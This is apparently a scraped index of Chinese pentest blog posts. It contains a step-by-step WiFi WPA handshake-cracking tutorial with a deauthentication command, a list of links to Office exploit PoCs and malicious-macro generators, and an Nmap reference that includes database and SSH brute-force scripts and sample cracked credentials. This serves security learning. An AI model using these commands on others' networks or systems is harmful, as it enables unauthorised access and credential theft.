","date":"2023-11-17","objectID":"/kali_linux_manual_distribution_network/:2:2","series":null,"tags":["linux"],"title":"kali linux 手动配网","uri":"/kali_linux_manual_distribution_network/#dns配置"},{"categories":["penetration"],"content":"一个很老wifi攻击手法 注意：私自破解他人 WiFi 属于违法行为，我这里使用的是自己买的 迷你版路由器 作为学习和测试。明白了破解原理就知道应该怎么防范了。 一、软件\u0026硬件环境 虚拟机：VMware Workstation 15.5.1 Pro Kali：kali-linux-2020.4-installer-amd64.iso 无线网卡：RT3070、RTL8187 等，自行选择 字典：WPA.txt 二、前期配置 1、打开 USB… 服务 打开 VMware USB Arbitration Service 服务，首先是 Win+R，输入 services.msc，敲击 Enter 键。 找到 VMware USB Arbitration Service，然后启动服务就可以了。 2、加载网卡 加载网卡之前，先完全启动 kali，然后 虚拟机 → 可移动设备 → 你的网卡 → 连接(断开与 主机 的连接)。 点击确定就行了。 查看网卡是否加载进来了。从图片中可以看出，名为 wlan0 的网卡已经加载进了 kali 中。 iwconfig 三、正式开始 1、开启无线网卡的监听模式 查看网卡是否支持监听模式。 airmon-ng 注：从图中可以看到我的无线网卡 wlan0 是支持监听模式的。如果该命令没有任何输出则表示没有可以支持监听模式的网卡。 开启无线网卡的监听模式。 airmon-ng start wlan0 开启监听模式之后，无线接口 wlan0 变成了 wlan0mon，可以使用 iwconfig 命令查看，如下图所示： 2、扫描当前环境的 WiFi 网络 使用 airodump-ng 命令列出无线网卡扫描到的 WiFi 详细信息，包括信号强度，加密类型，信道等。这里我们记下要破解WiFi 的 BSSID 和 信道，如图中我用红色框框标记出来的。当搜索到我们想要破解的 WiFi 热点时可以 Ctrl+C 停止搜索。 airodump-ng wlan0mon 3、抓取握手包 使用网卡的监听模式抓取周围的无线网络数据包，其中我们需要用到的数据包是包含了 WiFi密码 的握手包，当有新用户连接 WiFi 时会发送握手包。 airodump-ng -c 1 –bssid 64:51:7E:02:45:6A -w ./hack wlan0mon 参数解释： 参数 含义 -c 指定 WiFi 的通道(channel)，不细解释，自行学习 –bssid 指定 WiFi 的 BSSID，也就是 MAC 地址 -w 指定生成文件的名称 使用客户端连接这个 WiFi。 可以看到这里有握手包出现：WPA handshke: 64:51:7E:02:45:6A。 这是启动抓包命令后，生成的文件。 4、进行 WiFi 密码的破解（跑包） WPA.txt 是我上传到 kali 中的字典文件。 aircrack-ng -b 64:51:7E:02:45:6A -w ./WPA.txt ./hack-01.cap 参数解释： 参数 含义 -b 指定 WiFi 的 BSSID，也就是 MAC 地址 -w 指定字典文件 这不闲着也是闲着，就截了个动态图。以示我是真的在做，不是 P 图。 瞅瞅，看看，结果出来了，这当然肯定是我把密码（FFA4E9ED17）写进去了的，不然真的要运行到猴年马月呀。 5、附加 如果抓不到 握手包，就先把连接 WiFi 的客户端踢下线，然后对方会再次连接 WiFi，这样就可以抓取 握手包 了。抓取完 握手包 之后就可以进行上面第 4 步的破解（跑包）了。 aireplay-ng -0 5 -a 64:51:7E:02:45:6A -c 7C:B3:7B:84:54:BC wlan0mon 6、结语 能不能 破解 WiFi 网络，完全取决于你的字典是否足够强大。本文只提供学习思路，从来没有教唆他人去 破解 WiFi ，如有人举报，我不知道，我不会，我没有。请出门右拐。 ———————————————— 版权声明：本文为CSDN博主「边扯边淡」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/qq_43427482/article/details/111463630 ","date":"2023-11-17","objectID":"/kali-wifi/:0:0","series":null,"tags":["penetration"],"title":"kali打WiFi的传统思路","uri":"/kali-wifi/#"},{"categories":["exp"],"content":"收集的部分MS\u0026Office漏洞exp https://github.com/Lz1y/CVE-2017-8759 .NET Framework换行符漏洞，CVE-2017-8759完美复现 （另附加hta+powershell弹框闪烁解决方案）https://www.freebuf.com/vuls/147793.html https://github.com/WyAtu/CVE-2018-8581 Exchange使用完成添加收信规则的操作进行横向渗透和提权漏洞 https://github.com/dafthack/MailSniper PS,用于在Microsoft Exchange环境搜索电子邮件查找特定邮件（密码、网络架构信息等） https://github.com/sensepost/ruler GO,通过MAPI / HTTP或RPC / HTTP协议远程与Exchange服务器进行交互,通过客户端Outlook功能远程获取shell https://github.com/3gstudent/Smbtouch-Scanner 扫描内网永恒之蓝ETERNAL445SMB系列漏洞 https://github.com/smgorelik/Windows-RCE-exploits windows命令执行RCE漏洞POC样本，分为web与文件两种形式 https://github.com/3gstudent/CVE-2017-8464-EXP CVE-2017-8464，win快捷方式远程执行漏洞 https://github.com/Lz1y/CVE-2018-8420 Windows的msxml解析器漏洞可以通过ie或vbs执行后门 https://www.anquanke.com/post/id/163000 利用Excel 4.0宏躲避杀软检测的攻击技术分析 https://github.com/BuffaloWill/oxml_xxe XXE漏洞利用 https://thief.one/2017/06/20/1/ 浅谈XXE漏洞攻击与防御 https://github.com/thom-s/docx-embeddedhtml-injection word2016，滥用Word联机视频特征执行恶意代码poc https://blog.cymulate.com/abusing-microsoft-office-online-video word2016，滥用Word联机视频特征执行恶意代码介绍 https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads 无需开启宏即可在word文档中利用DDE执行命令 http://www.freebuf.com/articles/terminal/150285.html 无需开启宏即可在word文档中利用DDE执行命令利用 https://github.com/Ridter/CVE-2017-11882 利用word文档RTF获取shell，https://evi1cg.me/archives/CVE_2017_11882_exp.html https://github.com/Lz1y/CVE-2017-8759 利用word文档hta获取shell，http://www.freebuf.com/vuls/147793.html https://fuping.site/2017/04/18/CVE-2017-0199漏洞复现过程 WORD RTF 文档，配合msf利用 https://github.com/tezukanice/Office8570 利用ppsx幻灯片远程命令执行，https://github.com/rxwx/CVE-2017-8570 https://github.com/0x09AL/CVE-2018-8174-msf 目前支持的版本是 32 位 IE 浏览器和 32 位 office。 网页访问上线，浏览器关闭，shell 依然存活，http://www.freebuf.com/vuls/173727.html http://www.4hou.com/technology/9405.html 在 Office 文档的属性中隐藏攻击载荷 https://evi1cg.me/archives/Create_PPSX.html 构造PPSX钓鱼文件 https://github.com/enigma0x3/Generate-Macro PowerShell脚本，生成含有恶意宏的Microsoft Office文档 https://github.com/mwrlabs/wePWNise 生成独立于体系结构的VBA代码，用于Office文档或模板，并自动绕过应用程序控制 https://github.com/curi0usJack/luckystrike 基于ps，用于创建恶意的Office宏文档 https://github.com/sevagas/macro_pack MS Office文档、VBS格式、快捷方式payload捆绑 https://github.com/khr0x40sh/MacroShop 一组通过Office宏传递有效载荷的脚本 ","date":"2023-11-17","objectID":"/msoffice_exp/:0:0","series":null,"tags":["exp"],"title":"MS\u0026Office漏洞exp收集","uri":"/msoffice_exp/#"},{"categories":["tools","manual"],"content":"Nmap参数说明 ","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#"},{"categories":["tools","manual"],"content":"\r基本操作","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#基本操作"},{"categories":["tools","manual"],"content":"\r基本快速扫描Nmap 默认发送一个 arp 的 ping 数据包，来探测一些常用端口是否开放。 CODE nmap 10.130.1.43 ","date":"2023-11-17","objectID":"/nmap/:1:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#基本快速扫描"},{"categories":["tools","manual"],"content":"\r快速扫描多个目标 BASHnmap \u003ctarget ip1 address\u003e \u003ctarget ip2 address\u003e nmap 10.130.1.28 10.130.1.43 ","date":"2023-11-17","objectID":"/nmap/:2:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#快速扫描多个目标"},{"categories":["tools","manual"],"content":"\r详细描述输出扫描简单扫描，并对返回的结果详细描述输出，这个扫描是可以看到扫描的过程的，漫长的扫描的过程中可以看到百分比， 就不会显得那么枯燥，而且可以提升逼格。 CODE nmap -vv 10.1.1.254 亲测，`-v` 和 `-vv` 扫描几乎是一样都，都是列出了详细的扫描过程。 ","date":"2023-11-17","objectID":"/nmap/:3:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#详细描述输出扫描"},{"categories":["tools","manual"],"content":"\r指定端口和范围扫描Nmap 默认扫描目标的常见端口号。我们可以通过参数 -p 来指定设置我们将要扫描的端口号： BASHnmap -p(range) \u003ctarget IP\u003e namp -p3389,20-100 10.130.1.43 ","date":"2023-11-17","objectID":"/nmap/:4:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#指定端口和范围扫描"},{"categories":["tools","manual"],"content":"\r扫描除过某一个 ip 外的所有子网主机 CODE nmap 10.130.1.1/24 -exclude 10.130.1.1 ","date":"2023-11-17","objectID":"/nmap/:5:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#扫描除过某一个-ip-外的所有子网主机"},{"categories":["tools","manual"],"content":"\r扫描除过某一个文件中的 ip 外的子网主机 BASH nmap 10.130.1.1/24 -excludefile gov.txt ","date":"2023-11-17","objectID":"/nmap/:6:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#扫描除过某一个文件中的-ip-外的子网主机"},{"categories":["tools","manual"],"content":"\r显示扫描的所有主机的列表 BASH nmap -sL 10.130.1.1/24 ","date":"2023-11-17","objectID":"/nmap/:7:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#显示扫描的所有主机的列表"},{"categories":["tools","manual"],"content":"\rsP ping 扫描Nmap 可以利用类似 Window/Linux 系统下的 ping 方式进行扫描 BASH nmap -sP \u003ctarget ip\u003e 一般来说 我们会用这个命令去扫描内网的一个 IP 范围，用来做内网的主机发现。 BASH nmap -sP 10.130.1.1-255 PING 扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的。它不是用来发现是否开放端口的，PING 扫描需要 ROOT 权限。 ","date":"2023-11-17","objectID":"/nmap/:8:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#sp-ping-扫描"},{"categories":["tools","manual"],"content":"\rsS SYN 半开放扫描 BASH nmap -sS 192.168.1.1 Tcp SYN Scan (sS) 这是一个基本的扫描方式，它被称为半开放扫描，因为这种技术使得 Nmap 不需要通过完整的握手，就能获得远程主机的信息。Nmap 发送 SYN 包到远程主机，但是它不会产生任何会话。因此不会在目标主机上产生任何日志记录，因为没有形成会话。这个就是 SYN 扫描的优势，如果 Nmap 命令中没有指出扫描类型，默认的就是 Tcp SYN。但是它同样也需要 root/administrator 权限。 ","date":"2023-11-17","objectID":"/nmap/:9:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#ss-syn-半开放扫描"},{"categories":["tools","manual"],"content":"\rsT TCP 扫描 BASH nmap -sT 192.168.1.1 不同于 Tcp SYN 扫描，Tcp connect () 扫描需要完成三次握手，并且要求调用系统的 connect ().Tcp connect () 扫描技术只适用于找出 TCP 和 UDP 端口。 ","date":"2023-11-17","objectID":"/nmap/:10:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#st-tcp-扫描"},{"categories":["tools","manual"],"content":"\rsU UDP 扫描 BASH nmap -sU 192.168.1.1 这种扫描技术用来寻找目标主机打开的 UDP 端口，它不需要发送任何的 SYN 包，因为这种技术是针对 UDP 端口的。UDP 扫描发送 UDP 数据包到目标主机，并等待响应。如果返回 ICMP 不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的。 ","date":"2023-11-17","objectID":"/nmap/:11:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#su-udp-扫描"},{"categories":["tools","manual"],"content":"\rsF FIN 标志的数据包扫描 BASH nmap -sF 110.130.1.43 可以看出这个扫描的话 会漏扫许多，FIN 扫描也不会在目标主机上创建日志（FIN 扫描的优势之一）。这个类型的扫描都是具有差异性的，FIN 扫描发送的包只包含 FIN 标识，NULL 扫描不发送数据包上的任何字节，XMAS 扫描发送 FIN、PSH 和 URG 标识的数据包。 ","date":"2023-11-17","objectID":"/nmap/:12:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#sf-fin-标志的数据包扫描"},{"categories":["tools","manual"],"content":"\rsV Version 版本检测扫描 BASH nmap -sV 192.168.1.135 本检测是用来扫描目标主机和端口上运行的软件的版本。它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本。使用版本检测扫描之前需要先用 TCP SYN 扫描开放了哪些端口。这个扫描的话，速度会慢一些，67.86 秒扫一个 IP。 ","date":"2023-11-17","objectID":"/nmap/:13:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#sv-version-版本检测扫描"},{"categories":["tools","manual"],"content":"\rO OS 操作系统类型的探测 BASH nmap -O 10.130.1.43 远程检测操作系统和软件，Nmap 的 OS 检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。Nmap 有一个名为的 nmap-OS-DB 数据库，该数据库包含超过 2600 种操作系统的信息。Nmap 把 TCP 和 UDP 数据包发送到目标机器上，然后检查结果和数据库对照。 ","date":"2023-11-17","objectID":"/nmap/:14:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#o-os-操作系统类型的探测"},{"categories":["tools","manual"],"content":"\rosscan-guess 猜测匹配操作系统 CODE nmap -O --osscan-guess 192.168.1.134 通过 Nmap 准确的检测到远程操作系统是比较困难的，需要使用到 Nmap 的猜测功能选项，–osscan-guess 猜测认为最接近目标的匹配操作系统类型。 ","date":"2023-11-17","objectID":"/nmap/:15:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#osscan-guess-猜测匹配操作系统"},{"categories":["tools","manual"],"content":"\rPN No ping 扫描 BASH nmap -O -PN 192.168.1.1/24 如果远程主机有防火墙，IDS 和 IPS 系统，你可以使用 -PN 命令来确保不 ping 远程主机，因为有时候防火墙会组织掉 ping 请求。-PN 命令告诉 Nmap 不用 ping 远程主机。有时候使用 -PN 参数可以绕过 PING 命令，但是不影响主机的系统的发现。 ","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#pn-no-ping-扫描"},{"categories":["tools","manual"],"content":"\rT 设置时间模板 BASH nmap -sS -T\u003c0-5\u003e 192.168.1.134 优化时间控制选项的功能很强大也很有效，但有些用户会被迷惑。此外， 往往选择合适参数的时间超过了所需优化的扫描时间。因此，Nmap 提供了一些简单的 方法，使用 6 个时间模板，使用时采用 - T 选项及数字 (0 - 5) 或名称。模板名称有 paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5) paranoid、sneaky 模式用于 IDS 躲避 Polite 模式降低了扫描 速度以使用更少的带宽和目标主机资源。 Normal 为默认模式，因此 - T3 实际上是未做任何优化。 Aggressive 模式假设用户具有合适及可靠的网络从而加速扫描. nsane 模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。 ","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#t-设置时间模板"},{"categories":["tools","manual"],"content":"\r网段扫描格式 BASH nmap -sP \u003cnetwork address \u003e \u003c/CIDR \u003e 解释：CIDR 为你设置的子网掩码 (/24 , /16 ,/8 等) BASH10.1.1.0/24 = 10.1.1.1-10.1.1.255 # c段扫描 10.1.1.0/16 = 10.1.1.1-10.1.255.255 # b段扫描 10.1.1.0/8 = 10.1.1.1-10.255.255.255 # a段扫描 ","date":"2023-11-17","objectID":"/nmap/:1:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#网段扫描格式"},{"categories":["tools","manual"],"content":"\r从文件中读取需要扫描的 IP 列表 BASH nmap -iL ip-address.txt ","date":"2023-11-17","objectID":"/nmap/:2:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#从文件中读取需要扫描的-ip-列表"},{"categories":["tools","manual"],"content":"\r路由跟踪扫描路由器追踪功能，能够帮网络管理员了解网络通行情况，同时也是网络管理人员很好的辅助工具！通过路由器追踪可以轻松的查处从我们电脑所在地到目标地之间所经常的网络节点，并可以看到通过各个节点所花费的时间。 BASH nmap -traceroute www.baidu.com ","date":"2023-11-17","objectID":"/nmap/:3:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#路由跟踪扫描"},{"categories":["tools","manual"],"content":"\rA OS 识别 版本探测 脚本扫描和 traceroute 综合扫描此选项设置包含了常见的端口 ping 扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测。 BASH nmap -A 10.130.1.43 ","date":"2023-11-17","objectID":"/nmap/:4:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#a-os-识别-版本探测-脚本扫描和-traceroute-综合扫描"},{"categories":["tools","manual"],"content":"\r命令混合式扫描命令混合扫描，可以做到类似参数 -A 所完成的功能，但又能细化到我们所需特殊要求。所以一般高手选择这个混合扫描： BASH nmap -vv -p1-100,3306,3389 -O -traceroute 10.130.1.43 这些参数都是可以灵活调用的，具体根据具体的扫描来使用各个参数。 BASH nmap -p1-65535 -sV -sS -T4 10.130.1.134 使 SYN 扫描，并进行 Version 版本检测 使用 T4 (aggressive) 的时间模板对目标 IP 的全端口进行扫描。 ","date":"2023-11-17","objectID":"/nmap/:5:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#命令混合式扫描"},{"categories":["tools","manual"],"content":"\r输出格式扫描的结果输出到屏幕，同时会存储一份到 grep-output.txt BASH nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24 输出 XML 格式： S nmap 10.0.1.0/24 -oX res.xml 扫描结果输出为 HTML 格式 BASH nmap -sS -sV -T5 10.0.1.99 --webxml -oX - | xsltproc --output file.html ","date":"2023-11-17","objectID":"/nmap/:6:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#输出格式"},{"categories":["tools","manual"],"content":"\rNmap 高级用法之脚本使用","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#nmap-高级用法之脚本使用"},{"categories":["tools","manual"],"content":"\r按照脚本分类进行扫描 BASH nmap --script 类别 nmap 官方脚本文档: https://nmap.org/nsedoc/ 左侧列出了脚本的分类，点击分类可以看到每一个分类下有很多具体的脚本供我们使用。 nmap --script=类别 这里的类别，可以填写下面 14 大分类中的其中之一，也可以填写分类里面的具体漏洞扫描脚本。 Nmap 脚本分类: VERILOG- auth: 负责处理鉴权证书（绕开鉴权）的脚本 - broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务 - brute: 提供暴力破解方式，针对常见的应用如http/snmp等 - default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力 - discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等 - dos: 用于进行拒绝服务攻击 - exploit: 利用已知的漏洞入侵系统 - external: 利用第三方的数据库或资源，例如进行whois解析 - fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 - intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽 - malware: 探测目标机是否感染了病毒、开启了后门等信息 - safe: 此类与intrusive相反，属于安全性脚本 - version: 负责增强服务与版本扫描（Version Detection）功能的脚本 - vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067 ","date":"2023-11-17","objectID":"/nmap/:1:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#按照脚本分类进行扫描"},{"categories":["tools","manual"],"content":"\r使用具体脚本进行扫描 CODE nmap --script 具体的脚本 www.baidu.com ","date":"2023-11-17","objectID":"/nmap/:2:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#使用具体脚本进行扫描"},{"categories":["tools","manual"],"content":"\r常用脚本使用案例","date":"2023-11-17","objectID":"/nmap/:3:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#常用脚本使用案例"},{"categories":["tools","manual"],"content":"\r扫描服务器的常见漏洞 BASH nmap --script vuln \u003ctarget\u003e ","date":"2023-11-17","objectID":"/nmap/:3:1","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#扫描服务器的常见漏洞"},{"categories":["tools","manual"],"content":"\r检查 FTP 是否开启匿名登陆 BASHnmap --script ftp-anon \u003ctarget\u003e PORT STATE SERVICE 21/tcp open ftp | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 1170 924 31 Mar 28 2001 .banner | d--x--x--x 2 root root 1024 Jan 14 2002 bin | d--x--x--x 2 root root 1024 Aug 10 1999 etc | drwxr-srwt 2 1170 924 2048 Jul 19 18:48 incoming [NSE: writeable] | d--x--x--x 2 root root 1024 Jan 14 2002 lib | drwxr-sr-x 2 1170 924 1024 Aug 5 2004 pub |_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all. ","date":"2023-11-17","objectID":"/nmap/:3:2","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#检查-ftp-是否开启匿名登陆"},{"categories":["tools","manual"],"content":"\r对 MySQL 进行暴破解 BASHnmap --script=mysql-brute \u003ctarget\u003e 3306/tcp open mysql | mysql-brute: | Accounts | root:root - Valid credentials ","date":"2023-11-17","objectID":"/nmap/:3:3","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#对-mysql-进行暴破解"},{"categories":["tools","manual"],"content":"\r对 MSSQL 进行暴破解 BASHnmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt \u003chost\u003e | ms-sql-brute: | [192.168.100.128\\TEST] | No credentials found | Warnings: | sa: AccountLockedOut | [192.168.100.128\\PROD] | Credentials found: | webshop_reader:secret =\u003e Login Success | testuser:secret1234 =\u003e PasswordMustChange |_ lordvader:secret1234 =\u003e Login Success ","date":"2023-11-17","objectID":"/nmap/:3:4","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#对-mssql-进行暴破解"},{"categories":["tools","manual"],"content":"\r对 Oracle 数据库进行暴破解 BASHnmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL \u003chost\u003e PORT STATE SERVICE REASON 1521/tcp open oracle syn-ack | oracle-brute: | Accounts | system:powell =\u003e Account locked | haxxor:haxxor =\u003e Valid credentials | Statistics |_ Perfomed 157 guesses in 8 seconds, average tps: 19 ","date":"2023-11-17","objectID":"/nmap/:3:5","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#对-oracle-数据库进行暴破解"},{"categories":["tools","manual"],"content":"\r对 pgSQL 的暴力破解 BASHnmap -p 5432 --script pgsql-brute \u003chost\u003e 5432/tcp open pgsql | pgsql-brute: | root:\u003cempty\u003e =\u003e Valid credentials |_ test:test =\u003e Valid credentials ","date":"2023-11-17","objectID":"/nmap/:3:6","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#对-pgsql-的暴力破解"},{"categories":["tools","manual"],"content":"\r对 SSH 进行暴力破解 BASHnmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s \u003ctarget\u003e 22/ssh open ssh | ssh-brute: | Accounts | username:password | Statistics |_ Performed 32 guesses in 25 seconds. ","date":"2023-11-17","objectID":"/nmap/:3:7","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#对-ssh-进行暴力破解"},{"categories":["tools","manual"],"content":"\r利用 DNS 进行子域名暴力破解 BASHnmap --script dns-brute www.baidu.com λ nmap --script dns-brute www.baidu.com Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 13:12 ? Nmap scan report for www.baidu.com (180.97.33.108) Host is up (0.018s latency). Other addresses for www.baidu.com (not scanned): 180.97.33.10 Not shown: 998 filtered ports PORT STATE SERVICE 80/tcp open http 443/tcp open https Host script results: | dns-brute: | DNS Brute-force hostnames: | admin.baidu.com - 10.26.109.19 | mx.baidu.com - 61.135.163.61 | svn.baidu.com - 10.65.211.174 | ads.baidu.com - 10.42.4.225 Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds ","date":"2023-11-17","objectID":"/nmap/:3:8","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#利用-dns-进行子域名暴力破解"},{"categories":["tools","manual"],"content":"\r检查 VMWare ESX，ESXi 和服务器（CVE-2009-3733）中的路径遍历漏洞 BASHnmap --script http-vmware-path-vuln -p80,443,8222,8333 \u003chost\u003e | http-vmware-path-vuln: | VMWare path traversal (CVE-2009-3733): VULNERABLE | /vmware/Windows 2003/Windows 2003.vmx | /vmware/Pentest/Pentest - Linux/Linux Pentest Bravo.vmx | /vmware/Pentest/Pentest - Windows/Windows 2003.vmx | /mnt/vmware/vmware/FreeBSD 7.2/FreeBSD 7.2.vmx | /mnt/vmware/vmware/FreeBSD 8.0/FreeBSD 8.0.vmx | /mnt/vmware/vmware/FreeBSD 8.0 64-bit/FreeBSD 8.0 64-bit.vmx |_ /mnt/vmware/vmware/Slackware 13 32-bit/Slackware 13 32-bit.vmx ","date":"2023-11-17","objectID":"/nmap/:3:9","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#检查-vmware-esxesxi-和服务器cve-2009-3733中的路径遍历漏洞"},{"categories":["tools","manual"],"content":"\r查询 VMware 服务器（vCenter，ESX，ESXi）SOAP API 以提取版本信息。 BASHλ nmap --script vmware-version -p443 10.0.1.4 Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 12:26 ?D1ú±ê×?ê±?? Nmap scan report for 10.0.1.4 Host is up (0.0019s latency). PORT STATE SERVICE 443/tcp open https | vmware-version: | Server version: VMware ESXi 6.5.0 | Build: 4887370 | Locale version: INTL 000 | OS type: vmnix-x86 |_ Product Line ID: embeddedEsx Service Info: CPE: cpe:/o:vmware:ESXi:6.5.0 Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds ","date":"2023-11-17","objectID":"/nmap/:3:10","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#查询-vmware-服务器vcenteresxesxisoap-api-以提取版本信息"},{"categories":["tools","manual"],"content":"\r参数详解Nmap 支持主机名，网段的表示方式 例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254 VERILOG-iL filename 从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段 -iR hostnum 随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描 --exclude host1[, host2] 从扫描任务中需要排除的主机 --exculdefile exclude_file 排除文件中的IP,格式和-iL指定扫描文件的格式相同 ","date":"2023-11-17","objectID":"/nmap/:0:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#参数详解"},{"categories":["tools","manual"],"content":"\r主机发现 VERILOG-sL 仅仅是显示,扫描的IP数目,不会进行任何扫描 -sn ping扫描,即主机发现 -Pn 不检测主机存活 -PS/PA/PU/PY[portlist] TCP SYN Ping/TCP ACK Ping/UDP Ping发现 -PE/PP/PM 使用ICMP echo, timestamp and netmask 请求包发现主机 -PO[prococol list] 使用IP协议包探测对方主机是否开启 -n/-R 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析 ","date":"2023-11-17","objectID":"/nmap/:1:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#主机发现"},{"categories":["tools","manual"],"content":"\r扫描技巧 VERILOG-sS/sT/sA/sW/sM TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描 -sU UDP扫描 -sN/sF/sX TCP Null，FIN，and Xmas扫描 --scanflags 自定义TCP包中的flags -sI zombie host[:probeport] Idlescan -sY/sZ SCTP INIT/COOKIE-ECHO 扫描 -sO 使用IP protocol 扫描确定目标机支持的协议类型 -b “FTP relay host” 使用FTP bounce scan ","date":"2023-11-17","objectID":"/nmap/:2:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#扫描技巧"},{"categories":["tools","manual"],"content":"\r指定端口和扫描顺序 VERILOG-p 特定的端口 -p80,443 或者 -p1-65535 -p U:PORT 扫描udp的某个端口, -p U:53 -F 快速扫描模式,比默认的扫描端口还少 -r 不随机扫描端口,默认是随机扫描的 --top-ports \"number\" 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个 --port-ratio \"ratio\" 扫描指定频率以上的端口 ","date":"2023-11-17","objectID":"/nmap/:3:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#指定端口和扫描顺序"},{"categories":["tools","manual"],"content":"\r服务版本识别 VERILOG-sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测 --version-intensity \"level\" 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7 --version-light 打开轻量级模式,为--version-intensity 2的别名 --version-all 尝试所有探测,为--version-intensity 9的别名 --version-trace 显示出详细的版本侦测过程信息 ","date":"2023-11-17","objectID":"/nmap/:4:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#服务版本识别"},{"categories":["tools","manual"],"content":"\r脚本扫描 VERILOG-sC 根据端口识别的服务,调用默认脚本 --script=”Lua scripts” 调用的脚本名 --script-args=n1=v1,[n2=v2] 调用的脚本传递的参数 --script-args-file=filename 使用文本传递参数 --script-trace 显示所有发送和接收到的数据 --script-updatedb 更新脚本的数据库 --script-help=”Lua script” 显示指定脚本的帮助 ","date":"2023-11-17","objectID":"/nmap/:5:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#脚本扫描"},{"categories":["tools","manual"],"content":"\rOS 识别 VERILOG-O 启用操作系统检测,-A来同时启用操作系统检测和版本检测 